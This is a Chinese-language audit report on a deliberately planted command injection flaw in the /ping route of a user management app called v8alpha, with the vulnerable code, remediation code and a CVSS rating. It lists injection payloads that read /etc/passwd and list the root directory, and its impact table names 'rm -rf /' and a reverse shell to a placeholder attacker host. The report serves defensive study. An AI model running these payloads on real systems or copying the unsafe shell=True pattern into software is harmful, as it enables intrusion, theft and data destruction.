# 命令注入漏洞审计报告

> 审计项目：v8alpha 用户管理系统
> 审计日期：2026-07-16
> 漏洞类型：OS Command Injection（操作系统命令注入）
> 风险等级：**严重（Critical）** — 可导致服务器完全失陷

---

## 一、本次重点修复 — 命令注入漏洞

### 漏洞概述

v8alpha 在新增的 `/ping` 网络诊断功能中，存在**故意的命令注入漏洞**。攻击者可在登录后，通过在 IP 输入框中注入 shell 元字符，执行任意系统命令，从而实现远程代码执行（RCE），获取服务器完全控制权。

---

### 漏洞1：shell=True + 字符串拼接导致任意命令执行

#### 漏洞原理

`/ping` 路由在处理用户提交的 `ip` 参数时，使用 f-string 直接将用户输入拼接进 shell 命令字符串，并设置 `shell=True` 执行。由于 Python `subprocess.check_output` 在 `shell=True` 时会调用系统的 `/bin/sh` 解析命令字符串，攻击者可以利用 `;`、`&&`、`|` 等 shell 元字符注入并执行任意系统命令。

**核心问题链：**
1. **无输入校验** — `ip` 参数未经过任何过滤或白名单校验（第 1492 行）
2. **f-string 拼接** — 用户输入被直接注入命令模板（第 1499 行）
3. **shell=True** — shell 元字符被 `/bin/sh` 解析执行（第 1500 行）

#### 漏洞位置

**文件：** `v8alpha/app.py`

| 行号 | 代码 | 问题说明 |
|------|------|----------|
| 5-6 | `import subprocess` / `import platform` | 引入命令执行能力 |
| 1492 | `ip = request.form.get("ip", "").strip()` | 未对 ip 做任何校验 |
| 1499 | `cmd = f"ping -c 3 {ip}"` | **f-string 拼接用户输入到 shell 命令** |
| 1500 | `output = subprocess.check_output(cmd, shell=True, timeout=30, stderr=subprocess.STDOUT)` | **shell=True 使元字符生效** |

**关键漏洞代码（第 1499-1500 行）：**
```python
cmd = f"ping -c 3 {ip}"
output = subprocess.check_output(cmd, shell=True, timeout=30, stderr=subprocess.STDOUT)
```

#### 攻击方式与验证

所有测试均在 Kali Linux 上、以 `kali` 用户身份运行，验证了完整 RCE 效果：

| 测试用例 | 注入 payload | 攻击效果 |
|----------|-------------|----------|
| 正常 ping | `127.0.0.1` | Ping 127.0.0.1 正常执行，返回 3 个 ICMP 包结果 |
| 命令注入 | `127.0.0.1; id` | **成功！** 返回 `uid=1000(kali) gid=1000(kali)` |
| 文件泄露 | `127.0.0.1; cat /etc/passwd` | **成功！** 返回 `/etc/passwd` 全部内容 |
| 目录遍历 | `127.0.0.1 && ls -la /` | **成功！** 返回根目录列表 |
| 用户枚举 | `8.8.8.8; whoami` | **成功！** 返回 `kali` |

#### 修复方案

v8beta 采用以下三层防御机制：

**方案一：使用列表传参 + shell=False（推荐）**

```python
# 安全做法：列表传参，避免 shell 解析
cmd = ["ping", "-c", "3", ip]
output = subprocess.check_output(cmd, shell=False, timeout=30, stderr=subprocess.STDOUT)
```

此方式将命令和参数分开传递，操作系统不会调用 shell 解析，`;`、`&&`、`|` 等字符被视为普通参数而非命令分隔符，从根本上杜绝命令注入。

**方案二：正则白名单校验**

```python
import re

# 仅允许合法 IP 地址和标准域名格式
IP_PATTERN = re.compile(r'^[a-zA-Z0-9.\-]+$')

def validate_ip(ip):
    """校验 IP 地址或域名字符合法性"""
    if not IP_PATTERN.match(ip):
        return False
    # 可选：额外检查是否为有效 IP 或域名
    return True
```

**方案三：完整安全代码**

```python
@app.route("/ping", methods=["GET", "POST"])
def ping():
    uid = session.get("uid")
    if not uid:
        return redirect(url_for("login"))

    user = db_get_user_safe(uid)
    if not user:
        session.clear()
        return redirect(url_for("login"))

    result = None
    error = None

    if request.method == "POST":
        if not validate_csrf():
            return render_template("ping.html", error="请求校验失败，请刷新页面后重试")

        ip = request.form.get("ip", "").strip()

        # 白名单校验：只允许合法 IP/域名
        if not re.match(r'^[a-zA-Z0-9.\-]+$', ip):
            return render_template("ping.html", error="IP 地址格式不合法")

        try:
            # 安全执行：列表传参 + shell=False
            cmd = ["ping", "-c", "3", ip]
            output = subprocess.check_output(
                cmd, shell=False, timeout=30, stderr=subprocess.STDOUT
            )
            result = output.decode("utf-8", errors="replace")
        except subprocess.TimeoutExpired:
            error = "Ping 超时（30秒）"
        except subprocess.CalledProcessError as e:
            error = e.output.decode("utf-8", errors="replace") if e.output else str(e)
        except Exception as e:
            error = f"执行错误: {str(e)}"

    generate_csrf_token()
    return render_template("ping.html", result=result, error=error)
```

### 漏洞2：无输入校验

#### 漏洞原理

`/ping` 路由的 POST 处理函数中，从表单读取 `ip` 参数后**未进行任何合法性校验**（第 1492 行），直接传递给命令执行函数。对比本系统的其他路由（如 URL 获取功能的 `_check_ip_safety`、注册功能的 `sanitize_input`），ping 功能完全没有复用已有的安全校验逻辑，形成了明显的安全短板。

#### 漏洞位置

- v8alpha/app.py 第 1492 行：`ip = request.form.get("ip", "").strip()` — 未做校验

#### 修复方案

添加白名单校验，仅允许合法 IP 地址和域名格式：

```python
# 修复后
ip = request.form.get("ip", "").strip()
if not ip:
    error = "请输入 IP 地址或域名"
elif not re.match(r'^[a-zA-Z0-9.\-]+$', ip):
    error = "IP 地址或域名格式不合法"
else:
    # 安全执行命令
    ...
```

#### 代码对比

| 方面 | v8alpha（漏洞版本） | v8beta（修复版本） |
|------|--------------------|--------------------|
| 输入校验 | 无 | 正则白名单 `^[a-zA-Z0-9.\-]+$` |
| 命令构建 | f-string 拼接 `f"ping -c 3 {ip}"` | 列表传参 `["ping", "-c", "3", ip]` |
| shell 调用 | `shell=True` | `shell=False` |
| 执行结果 | 原始输出直接返回给用户 | 原始输出直接返回给用户 |
| CSRF 保护 | 有 | 有 |

### 命令注入漏洞的影响范围

命令注入（OS Command Injection）是 OWASP Top 10 中风险等级最高的漏洞之一。成功利用可导致：

| 攻击后果 | 说明 |
|----------|------|
| **服务器完全失陷** | 攻击者可执行任意系统命令，完全控制服务器 |
| **敏感数据泄露** | 读取 `/etc/passwd`、数据库文件、配置文件等 |
| **权限提升** | 利用本地提权漏洞获取 root 权限 |
| **横向移动** | 以内网主机为跳板攻击其他内部系统 |
| **持久化后门** | 植入反向 Shell、挖矿程序、勒索软件等 |
| **数据销毁** | 执行 `rm -rf /` 等破坏性命令造成数据丢失 |
| **反弹 Shell** | `bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'` 等 |

**CVSS 3.1 评分：9.8（Critical）**
- 攻击向量：网络（Network）
- 攻击复杂度：低（Low）
- 所需权限：低（Low，需登录）
- 用户交互：无（None）
- 影响：机密性、完整性、可用性均为"高"

## 二、其他同步发现并修复的问题

### 1. CSRF Token 刷新机制

**状态：** 已具备

`/ping` 路由在 GET 请求时调用了 `generate_csrf_token()`（第 1509 行），确保每个页面都包含有效的 CSRF Token。POST 请求通过 `validate_csrf()`（第 1489 行）校验 Token 合法性，防止跨站请求伪造攻击。

### 2. 回话认证检查

**状态：** 已具备

`/ping` 路由在函数入口处检查 `session.get("uid")`（第 1476 行），未登录用户被重定向到 `/login`，确保功能仅对已认证用户开放。

### 3. 登录频率限制

**状态：** 已具备

本系统在多处实现了登录频率限制（第 451-458 行），包括 IP 维度和用户名维度的双重限流机制，有效防止暴力破解攻击。

### 4. 错误信息处理

**状态：** 待改进

`/ping` 路由在 `except Exception as e` 中直接返回 `str(e)`（第 1507 行），可能泄露系统内部信息。建议统一返回通用错误信息，避免信息泄露。
